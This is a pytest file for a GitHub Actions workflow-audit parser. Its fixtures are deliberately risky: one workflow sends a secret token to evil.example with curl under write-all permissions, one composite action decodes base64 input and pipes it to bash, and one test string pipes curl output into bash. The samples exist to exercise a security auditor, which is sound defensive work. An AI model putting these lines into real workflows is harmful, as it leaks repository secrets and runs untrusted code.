from credence.workflow_audit.parser import parse_workflow, parse_action, run_script_refs


GOOD = """
name: CI
on:
  pull_request_target:
    types: [opened]
  workflow_dispatch:
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    permissions: write-all
    env:
      TOKEN: ${{ secrets.PROD }}
    steps:
      - name: checkout
        uses: actions/checkout@v4
      - name: run
        run: |
          echo hello
          curl -d "$TOKEN" https://evil.example
"""


def test_parse_extracts_triggers_jobs_steps_env():
    wf = parse_workflow(GOOD, path=".github/workflows/ci.yml")
    assert wf.parse_ok is True
    assert wf.name == "CI"
    assert set(wf.on_events) == {"pull_request_target", "workflow_dispatch"}
    assert wf.permissions_absent is False
    job = wf.jobs[0]
    assert job.job_id == "build"
    assert job.permissions == "write-all"
    assert job.env["TOKEN"] == "${{ secrets.PROD }}"
    assert job.steps[0].uses == "actions/checkout@v4"
    assert "curl" in job.steps[1].run


def test_on_as_list_and_string_forms_normalize():
    assert parse_workflow("on: push\njobs: {}", path="x").on_events == ["push"]
    assert set(parse_workflow("on: [push, pull_request]\njobs: {}",
                              path="x").on_events) == {"push", "pull_request"}


def test_malformed_yaml_sets_parse_ok_false_keeps_raw():
    wf = parse_workflow("on: [push\n  bad: : :", path=".github/workflows/x.yml")
    assert wf.parse_ok is False
    assert wf.raw_text.startswith("on: [push")
    assert wf.jobs == []


def test_permissions_absent_flag():
    wf = parse_workflow("on: push\njobs:\n  a:\n    runs-on: x\n    steps: []",
                        path="x")
    assert wf.permissions_absent is True
    assert wf.jobs[0].permissions_absent is True


COMPOSITE = """
name: build-action
runs:
  using: composite
  steps:
    - run: echo "${{ inputs.token }}" | base64 -d | bash
      shell: bash
"""


def test_parse_action_returns_composite_workflow_with_steps():
    wf = parse_action(COMPOSITE, path=".github/actions/build/action.yml")
    assert wf.is_composite_action is True
    assert wf.parse_ok is True
    # composite steps are surfaced as a single synthetic job "runs"
    assert wf.jobs[0].job_id == "runs"
    assert "base64 -d" in wf.jobs[0].steps[0].run


def test_run_script_refs_finds_local_script_invocations():
    run = "bash ./scripts/build.sh\n./tools/deploy"
    refs = run_script_refs(run)
    assert "./scripts/build.sh" in refs
    assert "./tools/deploy" in refs


def test_run_script_refs_ignores_remote_and_inline():
    assert run_script_refs("curl https://x | bash") == []
    assert run_script_refs("echo hello") == []


def test_run_script_refs_handles_chained_operators():
    # Bug: optional `(?:bash|sh|source|\.)?` prefix was consuming the leading `.`
    # of `./script.sh` when a separator immediately preceded it, yielding `/second.sh`.
    refs = run_script_refs("bash ./first.sh && ./second.sh")
    assert "./first.sh" in refs
    assert "./second.sh" in refs
    assert not any(r.startswith("/") for r in refs), f"Bare absolute path captured: {refs}"

    refs2 = run_script_refs("./setup.sh || ./fallback.sh")
    assert "./setup.sh" in refs2
    assert "./fallback.sh" in refs2
    assert not any(r.startswith("/") for r in refs2), f"Bare absolute path captured: {refs2}"


def test_steps_and_jobs_carry_line_numbers():
    text = (
        "on: push\n"            # line 1
        "jobs:\n"               # line 2
        "  build:\n"            # line 3
        "    runs-on: x\n"      # line 4
        "    steps:\n"          # line 5
        "      - run: echo a\n"  # line 6
        "      - run: echo b\n"  # line 7
    )
    wf = parse_workflow(text, path="x")
    assert wf.jobs[0].line == 3
    assert wf.jobs[0].steps[0].line == 6
    assert wf.jobs[0].steps[1].line == 7


def test_line_key_not_leaked_into_env_maps():
    wf = parse_workflow(
        "on: push\njobs:\n  a:\n    runs-on: x\n    env:\n      K: v\n    steps: []",
        path="x")
    assert wf.jobs[0].env == {"K": "v"}   # no __line__ key
